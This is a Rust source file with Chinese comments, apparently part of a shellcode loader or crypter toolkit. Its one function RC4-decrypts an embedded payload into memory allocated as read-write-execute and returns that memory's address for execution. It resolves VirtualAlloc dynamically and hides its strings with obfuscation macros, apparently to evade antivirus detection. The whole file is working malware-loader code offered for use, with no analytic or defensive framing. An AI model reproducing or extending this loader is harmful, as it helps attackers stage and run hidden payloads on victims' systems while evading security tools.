// RC4 解密
#[cfg(feature = "decrypt_rc4")]
#[allow(dead_code)]
pub unsafe fn decrypt_by_rc4(decoded: &[u8]) -> Result<usize, String> {
    use rustcrypt_ct_macros::{obf_lit, obf_lit_bytes};
    use windows_sys::Win32::System::Memory::{MEM_COMMIT, PAGE_EXECUTE_READWRITE};
    use windows_sys::Win32::System::LibraryLoader::{LoadLibraryA, GetProcAddress};
    use core::mem::transmute;
    use core::ffi::c_void;
    use rc4::{Rc4, StreamCipher, KeyInit};
    use generic_array::{GenericArray, typenum::U32};
    use sha2::{Sha256, Digest};
    let key_len = 32;
    let hash_len = 32;
    if decoded.len() < key_len + hash_len + 1 {
        return Err(obf_lit!("rc4 payload too short").to_string());
    }
    let key = &decoded[0..key_len];
    let hash = &decoded[key_len..key_len + hash_len];
    let encrypted = &decoded[key_len + hash_len..];
    type VirtualAllocFn = unsafe extern "system" fn(*mut c_void, usize, u32, u32) -> *mut c_void;
    let k32 = LoadLibraryA(obf_lit_bytes!(b"kernel32.dll\0").as_ptr());
    if k32 == 0 { return Err(obf_lit!("Failed to load kernel32.dll").to_string()); }
    let p_va = GetProcAddress(k32, obf_lit_bytes!(b"VirtualAlloc\0").as_ptr());
    if p_va.is_none() { return Err(obf_lit!("Failed to resolve VirtualAlloc").to_string()); }
    let virtual_alloc: VirtualAllocFn = transmute(p_va.unwrap());
    let p = virtual_alloc(core::ptr::null_mut(), encrypted.len(), MEM_COMMIT, PAGE_EXECUTE_READWRITE) as *mut u8;
    if p.is_null() {
        return Err(obf_lit!("VirtualAlloc failed").to_string());
    }
    std::ptr::copy_nonoverlapping(encrypted.as_ptr(), p, encrypted.len());
    let buf = std::slice::from_raw_parts_mut(p, encrypted.len());
    let key_array: &GenericArray<u8, U32> = GenericArray::from_slice(key);
    let mut cipher = Rc4::new(key_array);
    cipher.apply_keystream(buf);
    let mut hasher = Sha256::new();
    hasher.update(buf);
    let calc_hash = hasher.finalize();
    if hash != calc_hash.as_slice() {
        return Err(obf_lit!("rc4 hash mismatch").to_string());
    }
    Ok(p as usize) // 返回可执行内存地址
}